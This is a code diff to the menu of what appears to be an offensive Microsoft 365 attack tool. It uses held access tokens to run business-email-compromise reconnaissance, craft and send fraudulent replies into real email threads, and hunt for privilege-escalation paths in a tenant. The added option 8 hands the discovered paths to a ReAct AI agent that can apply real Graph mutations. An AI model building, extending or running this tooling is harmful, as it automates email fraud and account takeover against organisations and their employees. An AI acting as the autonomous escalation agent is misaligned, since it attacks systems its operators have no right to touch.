@@ -23,7 +23,7 @@ from .constants import (
     GROQ_API_KEY, GROQ_ENDPOINT, SCOUT_MODEL, ORCAROUTER_MODEL,
     TOKEN_FILE,
 )
-from .privesc import run_privesc, run_privesc_freestyle
+from .privesc import run_privesc, run_privesc_freestyle, run_privesc_agent, scopes_from_token
 
 if not GROQ_API_KEY:
     print("[!] GROQ_API_KEY environment variable not set.")
@@ -65,6 +65,15 @@ class TokenManager:
     def is_expired(self) -> bool:
         # Add 5-minute buffer
         return time.time() + 300 >= self.expires_at
+
+    def current_scopes(self) -> list:
+        """FRESHLY decode granted scopes from the CURRENT access token JWT.
+
+        Called per-step by the ReAct privesc agent so path viability is
+        evaluated against live grants (not a cached snapshot) before every
+        mutation.
+        """
+        return scopes_from_token(self.access_token or "")
 
     def refresh_access_token(self) -> bool:
         """Use refresh token to get a new access token."""
@@ -377,11 +386,12 @@ def interactive_menu(token_mgr: TokenManager):
         print("="*50)
         print("1. Refresh access token")
         print("2. Run BEC reconnaissance + crafting (top 2 threads)")
-        print("3. Run privilege-escalation analysis (deep, Qwen3.8-27B-Uncensored)")
-        print("4. Run freestyle privesc hunt (Qwen3.8-27B-Uncensored explores tenant)")
+        print("3. Run privilege-escalation analysis (deep, Foundation-Sec-8B analyst)")
+        print("4. Run freestyle privesc hunt (Foundation-Sec-8B explores tenant)")
         print("5. Send BEC for a specific thread (by index)")
         print("6. Show last recon summary")
         print("7. List vulnerable threads (if recon done)")
+        print("8. Run ReAct privesc agent (attempt discovered paths, dry-run)")
         print("q. Quit (save tokens)")
         choice = input("\nEnter choice: ").strip().lower()
 
@@ -434,10 +444,10 @@ def interactive_menu(token_mgr: TokenManager):
                     subject = f"RE: {vt['subject']}"
                     send_email(token_mgr, to_email, subject, email_body)
         elif choice == '3':
-            # Deep privilege-escalation analysis (M365 graph + Qwen3.8-27B-Uncensored)
+            # Deep privilege-escalation analysis (M365 graph + Foundation-Sec-8B analyst)
             print("\n[*] Starting deep privilege-escalation reconnaissance...")
             recon = asyncio.run(parallel_recon(token_mgr))
-            print("\n[Phase 2B] Privilege escalation analysis (deep inspection: apps, SPs, roles, misconfigs + Qwen3.8-27B-Uncensored)...")
+            print("\n[Phase 2B] Privilege escalation analysis (deep inspection: apps, SPs, roles, misconfigs + Foundation-Sec-8B analyst)...")
             privesc_result = run_privesc(token_mgr, recon)
             print(f"[+] Candidate paths found: {privesc_result.get('total_candidate_paths', 0)}")
             if privesc_result.get("status") == "success":
@@ -448,13 +458,31 @@ def interactive_menu(token_mgr: TokenManager):
                 for i, p in enumerate(privesc_result.get("top_3_paths", []), 1):
                     print(f"  [{i}] {p['name']} - PRIVESC probability: {p['probability_percent']}%")
                     print(f"      Impact: {p['impact']}")
+                    for st in p.get('steps', [])[:8]:
+                        print(f"        - {st}")
                     if p.get('reasoning'):
                         print(f"      Why: {p['reasoning'][:160]}")
+                # Save execution-ready targets for the ReAct agent (option 8).
+                targets = privesc_result.get("attempt_targets", [])
+                if targets:
+                    import os as _os
+                    from .constants import DATA_DIR as _DATA_DIR
+                    try:
+                        _os.makedirs(_DATA_DIR, exist_ok=True)
+                        _tt = _os.path.join(_DATA_DIR, "attempt_targets.json")
+                        with open(_tt, "w", encoding="utf-8") as _f:
+                            json.dump({
+                                "generated_at": privesc_result.get("timestamp"),
+                                "targets": targets,
+                            }, _f, indent=2)
+                        print(f"[+] Saved {len(targets)} attempt target(s) -> {_tt} (run option 8 to attempt them)")
+                    except Exception as _e:
+                        print(f"[!] Could not save attempt targets: {_e}")
             else:
                 print(f"[-] Privesc analysis: {privesc_result.get('reason', 'failed')}")
         elif choice == '4':
-            # Freestyle Qwen3.8-27B-Uncensored privesc hunt
-            print("\n[Phase 2C] Freestyle privilege-escalation hunt (Qwen3.8-27B-Uncensored freely explores tenant)...")
+            # Freestyle Foundation-Sec-8B privesc hunt
+            print("\n[Phase 2C] Freestyle privilege-escalation hunt (Foundation-Sec-8B freely explores tenant)...")
             fs_result = run_privesc_freestyle(token_mgr)
             if fs_result.get("status") == "success":
                 print(f"[+] Queries explored: {len(fs_result.get('queries_explored', []))}")
@@ -521,6 +549,34 @@ def interactive_menu(token_mgr: TokenManager):
                 print("\n[Vulnerable Threads]")
                 for i, vt in enumerate(vulnerable, 1):
                     print(f"{i}. Subject: {vt['subject']} (score: {vt['score']}%)")
+        elif choice == '8':
+            # ReAct privesc agent: attempt discovered paths (dry-run by default)
+            import os as _os
+            from .constants import DATA_DIR as _DATA_DIR
+            _tt = _os.path.join(_DATA_DIR, "attempt_targets.json")
+            targets = []
+            if _os.path.exists(_tt):
+                try:
+                    with open(_tt, "r", encoding="utf-8") as _f:
+                        targets = json.load(_f).get("targets", [])
+                    print(f"[+] Loaded {len(targets)} attempt target(s) from {_tt}")
+                except Exception as _e:
+                    print(f"[!] Failed to load attempt targets: {_e}")
+            else:
+                print("[!] No saved attempt_targets.json - running privesc analysis first...")
+                recon = asyncio.run(parallel_recon(token_mgr))
+                privesc_result = run_privesc(token_mgr, recon)
+                targets = privesc_result.get("attempt_targets", [])
+            if not targets:
+                print("[-] No attempt targets to run (run option 3 first).")
+                continue
+            exec_choice = input("DRY-RUN by default. Apply real Graph mutations? (y/n) [default n]: ").strip().lower() == 'y'
+            agent_report = run_privesc_agent(token_mgr, targets, execute=exec_choice)
+            if agent_report.get("status") == "success":
+                print(f"\n[Agent] {agent_report.get('succeeded', 0)}/{agent_report.get('attempted', 0)} path(s) completed "
+                      f"({agent_report.get('blocked', 0)} blocked) in {agent_report.get('mode')} mode.")
+            else:
+                print(f"[-] Agent: {agent_report.get('reason', 'failed')}")
         elif choice == 'q':
             print("[*] Exiting. Tokens saved.")
             token_mgr.save_to_file()
